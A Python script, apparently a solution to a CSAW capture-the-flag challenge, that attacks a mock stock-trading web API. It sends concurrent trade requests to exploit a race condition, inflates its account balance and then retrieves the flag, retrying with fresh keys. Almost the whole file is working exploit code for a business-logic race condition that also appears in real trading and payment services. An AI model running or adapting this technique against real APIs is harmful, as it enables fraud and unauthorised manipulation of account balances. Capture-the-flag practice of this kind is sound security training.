import requests
import json
import time
import random
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "http://android-dropper.csaw.io:4657"
KEY = f"testuser_{random.randint(1000,9999)}"

def api_request(endpoint, method='GET', data=None):
    try:
        if method == 'GET':
            r = requests.get(f"{BASE_URL}/{endpoint}")
        else:
            r = requests.post(f"{BASE_URL}/{endpoint}", data=data)
        return r.json() if endpoint == 'login' or endpoint == 'listCalls' else r.text
    except Exception as e:
        print(f"Request failed {endpoint}:", e)
        return None

def check_balance():
    return api_request('login', 'POST', {"key": KEY})

def get_stocks():
    return api_request('listCalls')

def buy_stock(stock):
    return api_request('buy', 'POST', {"key": KEY, "stock": stock})

def sell_stock(stock):
    return api_request('sell', 'POST', {"key": KEY, "stock": stock})

def trade_stocks(stock1, stock2):
    return api_request('trade', 'POST', {"key": KEY, "stock": stock1, "stock1": stock2})

def get_flag():
    return api_request('flag', 'POST', {"key": KEY})

def concurrent_trade(stock1, stock2):
    def trade_worker():
        return trade_stocks(stock1, stock2)

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(trade_worker) for _ in range(10)]
        results = [f.result() for f in futures]
    return results

def exploit_trading():
    print(f"Starting exploit with key: {KEY}")

    # Get initial state and stock prices
    stocks = get_stocks()
    print("Available stocks:", stocks)
    initial_balance = check_balance()
    print("Initial balance:", initial_balance)

    # Buy BROOKING stocks (lower price than BURPSHARKHAT)
    target_stock = "BROOKING"
    shares_to_buy = 5

    # Buy shares quickly
    for _ in range(shares_to_buy):
        result = buy_stock(target_stock)
        print(f"Buy result: {result}")

    print("Balance after buying:", check_balance())
    time.sleep(1)

    # Execute trades concurrently to trigger race condition
    print("Executing concurrent trades...")
    trade_results = concurrent_trade(target_stock, "BURPSHARKHAT")
    print("Trade results:", trade_results)

    time.sleep(2)  # Wait for trades to process
    print("Balance after trading:", check_balance())

    # Try to sell any BURPSHARKHAT we received
    print("Attempting to sell BURPSHARKHAT...")
    for _ in range(10):  # Try more sells than expected
        result = sell_stock("BURPSHARKHAT")
        print(f"Sell result: {result}")
        time.sleep(0.1)

    final_balance = check_balance()
    print("Final balance:", final_balance)

    if isinstance(final_balance, dict) and final_balance.get('balance', 0) > 9001:
        flag = get_flag()
        print("Flag result:", flag)
        return flag

    return None

# Run the exploit multiple times
for attempt in range(5):
    print(f"\nAttempt {attempt + 1}")
    result = exploit_trading()
    if result:
        print("Success! Flag found:", result)
        break
    KEY = f"testuser_{random.randint(1000,9999)}"
    time.sleep(2)

